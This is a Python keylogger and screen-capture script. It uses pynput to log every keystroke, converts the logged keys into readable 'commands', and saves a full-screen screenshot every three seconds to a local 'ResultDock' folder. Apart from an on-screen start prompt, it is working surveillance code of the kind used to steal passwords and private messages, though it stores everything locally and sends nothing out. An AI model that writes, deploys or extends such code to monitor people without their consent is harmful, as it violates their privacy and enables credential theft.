""" Import built-in modules """
import re
import sys
import time
from multiprocessing import Process
from pathlib import Path
# Import third-party modules #
from PIL import ImageGrab
from pynput.keyboard import Key, Listener


# Global variables #
global KEY_FILE, SCREENSHOT
LAST_PIC = 0
WAIT_TIME = 3


def on_press(key):
    """
    For key listener, write sentence to file if enter is pressed, kill screenshot capturing process
    if escape is pressed, otherwise append the entered key to the key capture list to form sentence.

    :param key:  The key that the key listener detected the user pressed.
    :return:  Nothing on enter key, boolean false on escape key, otherwise the keys capture list \
              with new member.
    """
    global KEY_FILE, KEYS, SCREENSHOT

    # If the enter key was pressed #
    if key == Key.enter:
        # Write the sentence logged in keys capture list to file #
        KEY_FILE.write(f'{str(KEYS)}\n\n')
        del KEYS[:]
    # If the escape key was pressed #
    elif key == Key.esc:
        # Kill the screenshot capturing process #
        SCREENSHOT.terminate()
        return False
    # If the key is intended to be recorded #
    else:
        KEYS.append(key)
        return KEYS

    return True

def screenshots(path: Path):
    """
    Loop that actively takes screenshots based on wait time interval.

    :param path:  Path to local storage for files.
    :return:  Nothing
    """
    global LAST_PIC

    while True:
        # Take a screenshot #
        pic = ImageGrab.grab()

        while True:
            # Format screenshot to number of last capture #
            pic_path = path / f'Screenshot{LAST_PIC}.png'

            # If file name is unique #
            if not pic_path.exists():
                # Save the picture as png #
                pic.save(pic_path)
                # Increment static count #
                LAST_PIC += 1
                break

            # Increment picture count #
            LAST_PIC += 1

        # Sleep execution by time interval #
        time.sleep(WAIT_TIME)


def regex_formatting(path: Path):
    """
    Parses the logged pynput keys into human-readable format.

    :param path:  Path to local storage for files.
    :return:  Nothing
    """
    # Compile parsing patterns #
    regex = re.compile(r'(?:(^\[)|([\',])|(]$))')
    regex2 = re.compile(r'''<Key\.
                            (?:ctrl|shift|alt|caps_lock|
                            tab|cmd|home|insert|delete|
                            end|page|left|down|right|up|
                            print_screen
                            )
                            ((?:_l|_r|_up|_down
                            )?)
                            :.<\d+>>''', re.X)

    regex3 = re.compile(r'[^\S\r\n]')
    regex4 = re.compile(r'<Key\.backspace:<8>>')
    regex5 = re.compile(r'<Key\.space:>')
    cmd_path = file_path / 'commands.txt'

    # Open un-formatted file #
    try:
        with path.open('r', encoding='utf-8') as parse_file:
            # Iterate line by line #
            for line in parse_file:
                # Perform a series of parsing substitutions #
                sub = re.sub(regex, r'', str(line))
                sub2 = re.sub(regex2, r'', str(sub))
                sub3 = re.sub(regex3, r'', str(sub2))
                sub4 = re.sub(regex4, r'', str(sub3))
                result = re.sub(regex5, r' ', str(sub4))

                # Open the result command log file #
                with cmd_path.open('a', encoding='utf-8') as final_log:
                    # Write parsed result to file #
                    final_log.write(result)

    # If error occurs during file operation #
    except (IOError, OSError) as file_err:
        # Print error and exit #
        print_err(f'Error occurred during regex parsing file operation: {file_err}')
        sys.exit(3)


def main():
    """
    Facilitates key listener thread and screenshot capture.

    :return:  Nothing
    """
    global KEY_FILE, SCREENSHOT

    key_path = file_path / 'keys.txt'
    input('[+] Please hit enter to begin or ctrl+c to stop ')
    print('[!] Now taking screenshots, hit escape to stop\n')

    try:
        # Open the file to record keystrokes #
        with key_path.open('a', encoding='utf-8') as KEY_FILE:
            # Create the key listener and screenshot taker #
            key_listener = Listener(on_press=on_press)
            SCREENSHOT = Process(target=screenshots, args=(file_path,))
            # Start the processes #
            key_listener.start()
            SCREENSHOT.start()
            # Join the processes #
            key_listener.join(600.0)
            SCREENSHOT.join(timeout=600)

    # If error occurs during file operation #
    except (IOError, OSError) as file_err:
        # Print error and exit #
        print_err(f'Error occurred during file operation logging keys: {file_err}')
        sys.exit(2)

    # Call the function to parse key logs to readable format #
    regex_formatting(key_path)
    main()


def print_err(msg: str):
    """
    Displays the passed in error message via stderr the durations on seconds passed in.

    :param msg:  The error message to be displayed.
    :return:  Nothing
    """
    print(f'\n* [ERROR] {msg} *\n', file=sys.stderr)


if __name__ == '__main__':
    # List for recording key presses #
    KEYS = []
    # Get the current working directory #
    cwd = Path('.')
    file_path = cwd / 'ResultDock'
    # Create storage directory #
    Path(str(file_path.resolve())).mkdir(parents=True, exist_ok=True)

    try:
        main()

    # If Ctrl + c is detected #
    except KeyboardInterrupt:
        print('\n[!] Ctrl-C detected ... exiting program')

    # If unknown system exception occurs #
    except Exception as ex:
        print_err(f'Unknown exception occurred: {ex}')
        sys.exit(1)

    sys.exit(0)
